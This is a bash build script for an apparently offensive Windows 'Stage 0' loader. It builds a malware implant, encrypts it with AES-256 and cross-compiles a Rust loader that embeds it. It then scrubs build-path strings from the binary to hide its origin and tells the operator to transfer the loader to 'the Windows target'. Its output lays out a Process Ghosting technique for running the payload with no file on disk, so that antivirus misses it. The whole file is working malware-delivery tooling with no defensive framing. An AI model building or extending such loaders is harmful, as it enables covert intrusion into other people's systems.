#!/bin/bash
# Build the Windows Stage 0 Loader
# Usage: bash build_loader.sh [IP]
# Requires: rustup target add x86_64-pc-windows-gnu && sudo apt install gcc-mingw-w64-x86-64
set -e
cd "$(dirname "$0")"

export PATH="$HOME/.rustup/toolchains/stable-x86_64-unknown-linux-gnu/bin:$PATH"

echo "═══════════════════════════════════════════════"
echo "  ERS-W Stage 0 Loader Builder (Windows)"
echo "═══════════════════════════════════════════════"

# Step 1: Build the Windows implant if needed
IMPLANT="../ers-w.exe"
if [ ! -f "$IMPLANT" ]; then
    echo "[*] Building Windows implant first..."
    cd ..
    bash build.sh "$1"
    cd loader
else
    echo "[*] Using existing implant: $IMPLANT"
fi

echo "[*] Implant size: $(du -h "$IMPLANT" | cut -f1)"

# Step 2: Encrypt the implant
echo "[*] Encrypting implant..."
python3 encrypt_payload.py "$IMPLANT"

# Step 3: Build the loader (cross-compile for Windows)
echo "[*] Building Windows loader..."
RUSTFLAGS="--remap-path-prefix=$HOME=. --remap-path-prefix=$(pwd)=." \
  cargo build --release --target x86_64-pc-windows-gnu

# Step 4: Copy and scrub
cp target/x86_64-pc-windows-gnu/release/ers-w-loader.exe ./stage0.exe

# Scrub build paths from the binary
python3 -c "
data = bytearray(open('stage0.exe','rb').read())
patches = [
    (b'/rustc/', b'\x00'*7),
    (b'/home/', b'\x00'*6),
    (b'.cargo/registry/', b'\x00'*16),
]
total = 0
for old, new in patches:
    assert len(old) == len(new)
    idx = 0
    while True:
        idx = data.find(old, idx)
        if idx == -1: break
        data[idx:idx+len(old)] = new
        idx += len(new)
        total += 1
open('stage0.exe','wb').write(data)
print(f'[+] {total} string patches applied')
"

echo ""
echo "═══════════════════════════════════════════════"
echo "  BUILD COMPLETE"
echo "═══════════════════════════════════════════════"
echo ""
echo "  Loader:  ./stage0.exe ($(du -h stage0.exe | cut -f1))"
echo "  Implant: $IMPLANT ($(du -h "$IMPLANT" | cut -f1))"
echo ""
echo "  Transfer ONLY ./stage0.exe to the Windows target."
echo "  The implant is AES-256 encrypted inside it."
echo ""
echo "  Technique: Process Ghosting"
echo "    1. Decrypt PE in memory"
echo "    2. Write to DELETE_ON_CLOSE temp file"
echo "    3. NtCreateSection (image section from file)"
echo "    4. Close handle → file vanishes from disk"
echo "    5. NtCreateProcessEx from section"
echo "    6. PE runs with no backing file"
echo ""
echo "  Fallback: temp write + CreateProcess + delayed delete"
echo ""
